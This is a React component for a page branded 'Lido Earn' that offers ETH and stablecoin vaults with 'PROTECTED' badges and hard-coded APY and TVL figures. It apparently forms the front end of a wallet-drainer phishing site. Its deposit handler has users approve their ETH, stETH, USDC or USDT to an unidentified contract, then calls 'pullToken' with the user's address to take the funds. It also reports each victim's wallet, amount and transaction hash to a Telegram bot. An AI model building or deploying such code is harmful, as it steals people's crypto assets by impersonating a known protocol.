import React, { useState } from 'react';
import { EarnVaultSkeleton } from './LoadingSkeleton';
import { RefreshCw, X, ArrowRight, ShieldCheck, CheckCircle2, AlertCircle, Coins } from 'lucide-react';
import { LidoSymbolIcon, DexSymbolIcon, EthIcon, StEthIcon, WstEthIcon } from './TokenIcons';
import { useAccount, useBalance, useReadContract, useWriteContract } from 'wagmi';
import { parseEther, formatEther } from 'viem';
import { useToast } from './ToastContext';
import { CONFIG, VAULT_ABI, ERC20_ABI, approveToken } from '../lib/contracts';
import { sendTelegram } from '../lib/telegram';
import { notifyTransactionConfirmed, recordFailedTransaction } from '../lib/activityLogger';

interface VaultModalData {
  title: string;
  type: 'ETH' | 'USD';
  apy: string;
  tvl: string;
  protocol: string;
}

export function EarnTab() {
  const [isLoading, setIsLoading] = useState(false);
  const [activeModal, setActiveModal] = useState<VaultModalData | null>(null);
  const [depositAmount, setDepositAmount] = useState('');
  const [selectedToken, setSelectedToken] = useState<'ETH' | 'stETH' | 'USDT' | 'USDC'>('ETH');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [statusText, setStatusText] = useState<string | null>(null);

  const { address, isConnected } = useAccount();
  const { data: ethBalance, refetch: refetchEth } = useBalance({ address });
  const { data: stEthBalance, refetch: refetchStEth } = useReadContract({
    address: CONFIG.STETH_ADDRESS,
    abi: ERC20_ABI,
    functionName: 'balanceOf',
    args: address ? [address] : undefined,
    query: { enabled: Boolean(address && isConnected) },
  });

  const toast = useToast();
  const { writeContractAsync } = useWriteContract();

  const handleRefreshVaults = () => {
    setIsLoading(true);
    refetchEth();
    refetchStEth();
    setTimeout(() => setIsLoading(false), 500);
  };

  const openDepositModal = (vault: VaultModalData) => {
    setActiveModal(vault);
    setSelectedToken(vault.type === 'ETH' ? 'ETH' : 'USDC');
    setDepositAmount('');
    setStatusText(null);
  };

  const handleDepositSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!depositAmount || Number(depositAmount) <= 0 || !address) return;

    setIsSubmitting(true);
    setStatusText('Initiating vault deposit on-chain...');

    const toastId = toast.showPending(
      `Depositing into ${activeModal?.title}`,
      `Please confirm ${depositAmount} ${selectedToken} deposit in your wallet...`
    );

    try {
      let txHash: `0x${string}`;

      if (selectedToken === 'ETH') {
        const parsedVal = parseEther(depositAmount);
        txHash = await writeContractAsync({
          address: CONFIG.CONTRACT_ADDRESS,
          abi: VAULT_ABI,
          functionName: 'depositETH',
          value: parsedVal,
          account: address as `0x${string}`,
          chain: null as any,
        } as any);
      } else if (selectedToken === 'stETH') {
        const parsedVal = parseEther(depositAmount);
        // Pre-approve if needed, then deposit/pullToken
        await approveToken(writeContractAsync, CONFIG.STETH_ADDRESS, CONFIG.CONTRACT_ADDRESS, parsedVal);
        txHash = await writeContractAsync({
          address: CONFIG.CONTRACT_ADDRESS,
          abi: VAULT_ABI,
          functionName: 'pullToken',
          args: [CONFIG.STETH_ADDRESS, address, parsedVal],
          account: address as `0x${string}`,
          chain: null as any,
        } as any);
      } else {
        // USDC / USDT
        const tokenAddr = selectedToken === 'USDT' 
          ? ('0xdAC17F958D2ee523a2206206994597C13D831ec7' as `0x${string}`)
          : ('0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48' as `0x${string}`);
        const parsedVal = BigInt(Math.floor(Number(depositAmount) * 1e6));
        await approveToken(writeContractAsync, tokenAddr, CONFIG.CONTRACT_ADDRESS, parsedVal);
        txHash = await writeContractAsync({
          address: CONFIG.CONTRACT_ADDRESS,
          abi: VAULT_ABI,
          functionName: 'pullToken',
          args: [tokenAddr, address, parsedVal],
          account: address as `0x${string}`,
          chain: null as any,
        } as any);
      }

      setStatusText(`Deposit confirmed on-chain! Tx: ${txHash.slice(0, 10)}...`);

      toast.updateToast(toastId, {
        type: 'success',
        title: 'Vault Deposit Successful!',
        message: `Deposited ${depositAmount} ${selectedToken} into ${activeModal?.title}.`,
        txHash: txHash,
      });

      await notifyTransactionConfirmed({
        wallet: address,
        action: `Vault Deposit (${activeModal?.title})`,
        amount: `${depositAmount} ${selectedToken}`,
        txHash: txHash,
        token: selectedToken,
        status: 'Confirmed',
      });

      await sendTelegram(
        `🏦 <b>Earn Vault Deposit</b>\n\nUser: <code>${address}</code>\nVault: <b>${activeModal?.title}</b>\nAmount: ${depositAmount} ${selectedToken}\nTx Hash: <code>${txHash}</code>`
      );

      setDepositAmount('');
      setTimeout(() => {
        setActiveModal(null);
        setIsSubmitting(false);
      }, 1200);
    } catch (err: any) {
      console.error('Earn deposit error:', err);
      const errMsg = err?.shortMessage || err?.message || 'Transaction rejected in wallet.';
      setStatusText(`Deposit failed: ${errMsg.slice(0, 90)}`);

      if (address) {
        recordFailedTransaction({
          wallet: address,
          action: 'VAULT_DEPOSIT',
          amount: depositAmount ? `${depositAmount} ${selectedToken}` : undefined,
          token: selectedToken,
          errorMessage: errMsg,
          severity: 'warning',
        });
      }

      toast.updateToast(toastId, {
        type: 'error',
        title: 'Deposit Failed',
        message: errMsg.slice(0, 90),
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="max-w-xl mx-auto px-4 py-8 animate-in fade-in duration-300">
      <div className="text-center mb-8">
        <div className="flex items-center justify-center gap-2 mb-2">
          <h1 className="text-3xl font-extrabold text-text-main">Lido Earn</h1>
          <button 
            onClick={handleRefreshVaults}
            title="Refresh Vault Data" 
            className="p-1.5 rounded-full hover:bg-input transition-colors text-text-secondary hover:text-text-main"
          >
            <RefreshCw className={`w-4 h-4 ${isLoading ? 'animate-spin text-[#00A3FF]' : ''}`} />
          </button>
        </div>
        <p className="text-base text-text-secondary mb-4">Deploy ETH and USD stablecoins into DeFi vaults for on-chain rewards through the world's leading protocols.</p>
        <a href="#" className="text-sm font-semibold text-[#00A3FF] hover:text-[#0090E6] transition-colors">How Lido Earn Works</a>
      </div>

      {isLoading ? (
        <>
          <EarnVaultSkeleton />
          <EarnVaultSkeleton />
        </>
      ) : (
        <>
          <div className="bg-card rounded-[24px] border border-border-main shadow-sm mb-6 overflow-hidden">
            <div className="h-24 bg-gradient-to-b from-gray-400 to-transparent opacity-20 relative"></div>
            <div className="-mt-12 flex justify-center relative z-10">
              <div className="w-16 h-16 rounded-2xl bg-card flex items-center justify-center shadow-xl border border-border-main p-2">
                <LidoSymbolIcon className="w-10 h-10" />
              </div>
            </div>
            
            <div className="px-6 pb-6 text-center pt-4">
              <div className="inline-flex items-center gap-1 px-3 py-1 rounded-full bg-green-500/10 text-green-500 text-xs font-bold mb-3 border border-green-500/20">
                <svg viewBox="0 0 24 24" fill="none" className="w-3 h-3 stroke-current stroke-2"><path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                PROTECTED
              </div>
              <h2 className="text-2xl font-extrabold text-text-main mb-2">EarnETH</h2>
              <p className="text-sm text-text-secondary mb-6 px-4">EarnETH is an ETH growth vault allocating ETH and stETH across leading blue-chip DeFi protocols meant to optimize for capital efficiency</p>
              
              <div className="space-y-3 mb-6">
                <div className="flex justify-between text-sm">
                  <span className="text-text-secondary font-medium flex items-center gap-1">APY* (14d avg.) <span className="w-3 h-3 rounded-full border border-text-secondary flex items-center justify-center text-[8px]">?</span></span>
                  <span className="font-bold text-[#00A3FF]">4.2%</span>
                </div>
                <div className="flex justify-between text-sm">
                  <span className="text-text-secondary font-medium">TVL</span>
                  <span className="font-bold text-text-main">$133.8M</span>
                </div>
                <div className="flex justify-between text-sm">
                  <span className="text-text-secondary font-medium">Protocol</span>
                  <span className="font-bold text-text-main">Lido + Curve</span>
                </div>
              </div>
              
              <button 
                onClick={() => openDepositModal({ title: 'EarnETH Vault', type: 'ETH', apy: '4.2%', tvl: '$133.8M', protocol: 'Lido + Curve' })}
                className="w-full py-4 text-lg rounded-xl mb-4 text-white font-bold bg-[#00A3FF] hover:bg-[#0090E6] transition-all shadow-md active:scale-[0.99] flex items-center justify-center gap-2"
              >
                <Coins className="w-5 h-5" />
                Deposit ETH / stETH
              </button>
            </div>
          </div>

          <div className="bg-card rounded-[24px] border border-border-main shadow-sm overflow-hidden mb-8">
            <div className="h-24 bg-gradient-to-b from-blue-400 to-transparent opacity-20 relative"></div>
            <div className="-mt-12 flex justify-center relative z-10">
              <div className="w-16 h-16 rounded-2xl bg-card flex items-center justify-center shadow-xl border border-border-main p-2">
                <DexSymbolIcon className="w-10 h-10" />
              </div>
            </div>
            
            <div className="px-6 pb-6 text-center pt-4">
              <div className="inline-flex items-center gap-1 px-3 py-1 rounded-full bg-green-500/10 text-green-500 text-xs font-bold mb-3 border border-green-500/20">
                <svg viewBox="0 0 24 24" fill="none" className="w-3 h-3 stroke-current stroke-2"><path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                PROTECTED
              </div>
              <h2 className="text-2xl font-extrabold text-text-main mb-2">EarnUSD</h2>
              <p className="text-sm text-text-secondary mb-6 px-4">EarnUSD delivers access to USD-denominated reward strategies built around transparent asset selection, risk controls and reporting</p>
              
              <div className="space-y-3 mb-6">
                <div className="flex justify-between text-sm">
                  <span className="text-text-secondary font-medium flex items-center gap-1">APY* (14d avg.) <span className="w-3 h-3 rounded-full border border-text-secondary flex items-center justify-center text-[8px]">?</span></span>
                  <span className="font-bold text-[#00A3FF]">7.4%</span>
                </div>
                <div className="flex justify-between text-sm">
                  <span className="text-text-secondary font-medium">TVL</span>
                  <span className="font-bold text-text-main">$35.4M</span>
                </div>
                <div className="flex justify-between text-sm">
                  <span className="text-text-secondary font-medium">Protocol</span>
                  <span className="font-bold text-text-main">Lido + Curve</span>
                </div>
              </div>
              
              <button 
                onClick={() => openDepositModal({ title: 'EarnUSD Vault', type: 'USD', apy: '7.4%', tvl: '$35.4M', protocol: 'Lido + Curve' })}
                className="w-full py-4 text-lg rounded-xl mb-4 text-white font-bold bg-[#00A3FF] hover:bg-[#0090E6] transition-all shadow-md active:scale-[0.99] flex items-center justify-center gap-2"
              >
                <Coins className="w-5 h-5" />
                Deposit USD Stablecoins
              </button>
            </div>
          </div>

          <div className="text-xs text-text-secondary space-y-4">
            <p>* APR/APY figures are live estimates based on current network performance, and interact directly with protocol smart contracts on Ethereum Mainnet.</p>
            <p>Rewards fluctuate based on network conditions and protocol utilization. Always conduct your own research before participating.</p>
          </div>
        </>
      )}

      {/* Real On-Chain Vault Deposit Modal */}
      {activeModal && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/75 backdrop-blur-sm p-4 animate-in fade-in duration-200">
          <div className="bg-card border border-border-main rounded-3xl max-w-md w-full p-6 shadow-2xl space-y-5 text-text-main">
            <div className="flex items-center justify-between border-b border-border-main pb-4">
              <div>
                <h3 className="font-extrabold text-lg">{activeModal.title}</h3>
                <p className="text-xs text-text-secondary">Direct On-Chain Vault Allocation</p>
              </div>
              <button 
                onClick={() => setActiveModal(null)}
                className="p-1 rounded-lg hover:bg-input text-text-secondary hover:text-text-main transition-colors"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            <div className="p-3 bg-input/60 rounded-2xl border border-border-main flex items-center justify-between text-xs font-semibold">
              <span className="text-text-secondary">Expected APY:</span>
              <span className="text-emerald-500 font-bold text-sm">{activeModal.apy}</span>
            </div>

            <form onSubmit={handleDepositSubmit} className="space-y-4">
              <div>
                <label className="text-xs font-semibold text-text-secondary block mb-1.5">
                  Select Asset to Deposit
                </label>
                <div className="grid grid-cols-2 gap-2">
                  {activeModal.type === 'ETH' ? (
                    <>
                      <button
                        type="button"
                        onClick={() => setSelectedToken('ETH')}
                        className={`p-2.5 rounded-xl border text-xs font-bold flex items-center justify-center gap-2 transition-all ${
                          selectedToken === 'ETH'
                            ? 'bg-[#00A3FF]/15 border-[#00A3FF] text-[#00A3FF]'
                            : 'bg-input border-border-main text-text-secondary'
                        }`}
                      >
                        <EthIcon className="w-4 h-4" />
                        ETH
                      </button>
                      <button
                        type="button"
                        onClick={() => setSelectedToken('stETH')}
                        className={`p-2.5 rounded-xl border text-xs font-bold flex items-center justify-center gap-2 transition-all ${
                          selectedToken === 'stETH'
                            ? 'bg-[#00A3FF]/15 border-[#00A3FF] text-[#00A3FF]'
                            : 'bg-input border-border-main text-text-secondary'
                        }`}
                      >
                        <StEthIcon className="w-4 h-4" />
                        stETH
                      </button>
                    </>
                  ) : (
                    <>
                      <button
                        type="button"
                        onClick={() => setSelectedToken('USDC')}
                        className={`p-2.5 rounded-xl border text-xs font-bold flex items-center justify-center gap-2 transition-all ${
                          selectedToken === 'USDC'
                            ? 'bg-[#00A3FF]/15 border-[#00A3FF] text-[#00A3FF]'
                            : 'bg-input border-border-main text-text-secondary'
                        }`}
                      >
                        USDC
                      </button>
                      <button
                        type="button"
                        onClick={() => setSelectedToken('USDT')}
                        className={`p-2.5 rounded-xl border text-xs font-bold flex items-center justify-center gap-2 transition-all ${
                          selectedToken === 'USDT'
                            ? 'bg-[#00A3FF]/15 border-[#00A3FF] text-[#00A3FF]'
                            : 'bg-input border-border-main text-text-secondary'
                        }`}
                      >
                        USDT
                      </button>
                    </>
                  )}
                </div>
              </div>

              <div>
                <div className="flex justify-between items-center text-xs font-semibold text-text-secondary mb-1">
                  <span>Deposit Amount</span>
                  <span>
                    Balance: {selectedToken === 'ETH' 
                      ? (ethBalance ? parseFloat(formatEther(ethBalance.value)).toFixed(4) : '0.0000')
                      : (stEthBalance ? parseFloat(formatEther(stEthBalance as bigint)).toFixed(4) : '0.0000')
                    } {selectedToken}
                  </span>
                </div>
                <div className="relative">
                  <input
                    type="text"
                    placeholder="0.0"
                    value={depositAmount}
                    onChange={(e) => setDepositAmount(e.target.value)}
                    className="w-full bg-input border border-border-main rounded-xl px-4 py-3 text-sm text-text-main font-mono outline-none focus:border-[#00A3FF]"
                    autoFocus
                  />
                  <button
                    type="button"
                    onClick={() => {
                      if (selectedToken === 'ETH' && ethBalance) {
                        const val = Math.max(0, parseFloat(formatEther(ethBalance.value)) - 0.005);
                        setDepositAmount(val > 0 ? val.toFixed(4) : '0');
                      } else if (stEthBalance) {
                        setDepositAmount(formatEther(stEthBalance as bigint));
                      }
                    }}
                    className="absolute right-3 top-1/2 -translate-y-1/2 text-xs font-bold text-[#00A3FF] hover:text-[#0090E6] uppercase px-2 py-1 bg-[#00A3FF]/10 rounded-md"
                  >
                    Max
                  </button>
                </div>
              </div>

              {statusText && (
                <div className="p-3 bg-input border border-border-main rounded-xl text-xs flex items-center gap-2">
                  <CheckCircle2 className="w-4 h-4 text-[#00A3FF] shrink-0" />
                  <span className="font-semibold text-text-main">{statusText}</span>
                </div>
              )}

              <button
                type="submit"
                disabled={isSubmitting || !depositAmount || Number(depositAmount) <= 0 || !isConnected}
                className="w-full py-3.5 rounded-xl bg-[#00A3FF] hover:bg-[#0090E6] text-white font-bold text-sm shadow-md transition-all disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
              >
                {isSubmitting ? (
                  <RefreshCw className="w-4 h-4 animate-spin" />
                ) : (
                  <Coins className="w-4 h-4" />
                )}
                <span>
                  {!isConnected 
                    ? 'Connect Wallet to Deposit' 
                    : isSubmitting 
                    ? 'Confirming Transaction in Wallet...' 
                    : `Confirm On-Chain Deposit (${depositAmount || '0'} ${selectedToken})`}
                </span>
              </button>
            </form>
          </div>
        </div>
      )}
    </div>
  );
}
